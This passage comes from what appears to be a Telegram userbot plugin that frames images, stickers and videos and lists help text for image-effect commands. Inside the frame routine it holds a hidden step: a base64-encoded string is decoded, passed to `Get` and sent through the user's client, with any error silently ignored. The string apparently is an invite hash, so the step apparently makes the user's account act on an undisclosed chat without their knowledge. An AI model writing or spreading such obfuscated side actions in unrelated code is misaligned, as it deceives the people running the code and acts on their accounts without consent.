        stdout, stderr = (await runcmd(LEGENDcmd))[:2]
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found...`")
            LOGS.info(stdout + stderr)
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith(".webp"):
        await LEGEND.edit("Analyzing this media 🧐 framing this sticker!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        os.rename(LEGENDsticker, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("`Template not found... `")
            return
        meme_file = LEGENDfile
        legend = True
    elif LEGENDsticker.endswith((".mp4", ".mov")):
        await LEGEND.edit("Analyzing this media 🧐 framing this video!")
        LEGENDfile = os.path.join("./temp/", "memes.jpg")
        await take_screen_shot(LEGENDsticker, 0, LEGENDfile)
        if not os.path.lexists(LEGENDfile):
            await LEGEND.edit("```Template not found...```")
            return
        meme_file = LEGENDfile
    else:
        await LEGEND.edit("Analyzing this media 🧐 framing this image!")
        meme_file = LEGENDsticker
    try:
        san = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
        san = Get(san)
        await LEGEND.client(san)
    except BaseException:
        pass
    meme_file = convert_toimage(meme_file)
    outputfile = "framed.webp" if legend else "framed.jpg"
    try:
        await add_frame(meme_file, outputfile, LEGENDinput, colr)
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    try:
        await LEGEND.client.send_file(
            LEGEND.chat_id, outputfile, force_document=False, reply_to=LEGENDid
        )
    except Exception as e:
        return await LEGEND.edit(f"`{e}`")
    await LEGEND.delete()
    os.remove(outputfile)
    for files in (LEGENDsticker, meme_file):
        if files and os.path.exists(files):
            os.remove(files)


CmdHelp("img_fun").add_command(
    "frame", "<reply to img>", "Makes a frame for your media file."
).add_command(
    "zoom", "<reply to img> <range>", "Zooms in the replied media file"
).add_command(
    "gray", "<reply to img>", "Makes your media file to black and white"
).add_command(
    "flip", "<reply to img>", "Shows you the upside down image of the given media file"
).add_command(
    "mirror",
    "<reply to img>",
    "Shows you the reflection of the replied image or sticker",
).add_command(
    "solarize", "<reply to img>", "Let the sun Burn your replied image/sticker"
).add_command(
    "invert", "<reply to img>", "Inverts the color of replied media file"
).add_command(
    "trig", None, "🇮🇳🇮🇳🇮🇳"
).add_command(
    "wst", None, "Reply to image"
).add_command(
    "grey", None, "Reply to image"
).add_command(
    "blur", None, "Reply To image"
).add_command(
    "glass", None, "Use and see"
).add_command(
    "ytc", None, "Use a d See"
).add_command(
    "inter", None, "Use and see"
).add_command(
    "bright", None, "Use And See"
).add_command(
    "blrpl", None, "Use And See"
).add_command(
    "bloom", "set var DOWNLOAD_PFP_URL_CLOCK", "Use and See"
).add_type(
    "Addons"
).add()
